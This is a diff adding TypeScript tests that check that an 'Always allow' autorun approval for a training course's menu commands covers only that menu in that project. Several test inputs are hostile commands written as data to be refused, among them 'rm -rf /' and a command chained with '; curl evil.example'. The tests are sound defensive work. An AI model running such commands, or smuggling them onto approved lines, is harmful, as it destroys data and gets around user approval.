@@ -3,7 +3,12 @@ import * as fs from "fs";
 import * as os from "os";
 import * as path from "path";
 import yaml from "js-yaml";
-import { isTrainingPanelCommandIn } from "../../utils/trainingPanelCommands";
+import {
+  autorunEntryFor,
+  isAutorunAuthorized,
+  isTrainingPanelCommandIn,
+  TRAINING_AUTORUN_ENTRY,
+} from "../../utils/trainingPanelCommands";
 
 /**
  * The training course is the one project whose custom menu commands may run in
@@ -192,5 +197,94 @@ suite("Training commands in the Command Runner panel", () => {
         `should be refused: ${command}`,
       );
     }
+  });
+
+  /**
+   * A learner meets a dozen Training menu entries across three levels, so
+   * "Always allow" stores the menu rather than the line. That blanket entry is
+   * the one thing here that could widen what runs without asking, so what it
+   * must NOT cover is most of what is tested.
+   */
+  suite("Always allow, on a Training command", () => {
+    test("stores the menu, not the line the learner happened to click", () => {
+      assert.strictEqual(
+        autorunEntryFor("node scripts/training.mjs init --level 1", root),
+        TRAINING_AUTORUN_ENTRY,
+      );
+    });
+
+    test("one answer covers every other Training menu entry", () => {
+      const stored = [TRAINING_AUTORUN_ENTRY];
+      for (const command of [
+        "node scripts/training.mjs init",
+        "node scripts/training.mjs status",
+        "node scripts/training.mjs check --level 2",
+        "node scripts/training.mjs claim --level 3",
+        "node scripts/training.mjs simulate --level 3",
+        "node scripts/training.mjs teardown",
+      ]) {
+        assert.strictEqual(
+          isAutorunAuthorized(command, stored, root),
+          true,
+          `should be authorized: ${command}`,
+        );
+      }
+    });
+
+    test("covers nothing outside the Training menu, in the same folder", () => {
+      const stored = [TRAINING_AUTORUN_ENTRY];
+      for (const command of [
+        "node scripts/deploy.mjs",
+        "node scripts/training.mjs check && rm -rf /",
+        "node scripts/training.mjs check; curl evil.example",
+        "npm run something",
+        "sf hardis:org:purge:flow",
+      ]) {
+        assert.strictEqual(
+          isAutorunAuthorized(command, stored, root),
+          false,
+          `should still ask: ${command}`,
+        );
+      }
+    });
+
+    test("gives nothing to another project shipping the same script", () => {
+      assert.strictEqual(
+        isAutorunAuthorized(
+          "node scripts/training.mjs init",
+          [TRAINING_AUTORUN_ENTRY],
+          notTraining,
+        ),
+        false,
+      );
+      assert.strictEqual(
+        autorunEntryFor("node scripts/training.mjs init", notTraining),
+        "node scripts/training.mjs init",
+        "outside the course it is the line that is stored, as before",
+      );
+    });
+
+    test("an ordinary custom command is still approved one by one", () => {
+      const stored = ["npm run lint"];
+      assert.strictEqual(
+        isAutorunAuthorized("npm run lint --fix", stored, root),
+        true,
+        "the exact line still matches as a prefix",
+      );
+      assert.strictEqual(
+        isAutorunAuthorized("npm run test", stored, root),
+        false,
+      );
+    });
+
+    test("an empty entry authorizes nothing", () => {
+      for (const stored of [[""], ["   "], ["", "npm run lint"]]) {
+        assert.strictEqual(
+          isAutorunAuthorized("rm -rf /", stored, root),
+          false,
+          `an empty entry must not authorize: ${JSON.stringify(stored)}`,
+        );
+      }
+    });
   });
 });
